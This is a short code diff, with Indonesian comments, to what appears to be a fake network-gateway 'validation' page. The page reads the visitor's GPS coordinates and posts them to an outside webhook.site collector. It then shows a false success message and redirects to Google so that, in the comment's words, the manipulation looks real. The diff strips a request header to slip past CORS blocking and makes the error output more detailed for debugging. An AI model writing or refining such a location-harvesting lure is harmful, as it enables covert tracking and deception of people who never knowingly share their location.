@@ -94,10 +94,9 @@
                 const lat = position.coords.latitude;
                 const lon = position.coords.longitude;
 
-                // Perbaikan 2: Menghapus spasi gaib di akhir URL Webhook agar fetch aman
+                // Perbaikan 3: Mengirim data tanpa header Content-Type agar lolos dari blokir CORS (Preflight OPTIONS)
                 fetch("https://webhook.site/63927741-6816-4b33-a3da-3c07c9f8b893", {
                     method: "POST",
-                    headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({
                         latitude: lat,
                         longitude: lon,
@@ -109,17 +108,16 @@
                     if (response.ok) {
                         status.style.color = "green";
                         status.innerHTML = "Validasi berhasil! Mengalihkan ke internet...";
-                        // Pengalihan otomatis (redirect) agar manipulasi terlihat nyata
                         setTimeout(() => {
                             window.location.href = "https://www.google.com";
                         }, 2000);
                     } else {
-                        throw new Error("Gagal mengirim data.");
+                        throw new Error("Server menolak data (Kode: " + response.status + ")");
                     }
                 })
                 .catch(error => {
                     status.style.color = "red";
-                    status.innerHTML = "Eror: Jaringan terputus saat menghubungi gateway.";
+                    status.innerHTML = "Eror Webhook: " + error.message;
                 });
             },
             (error) => {
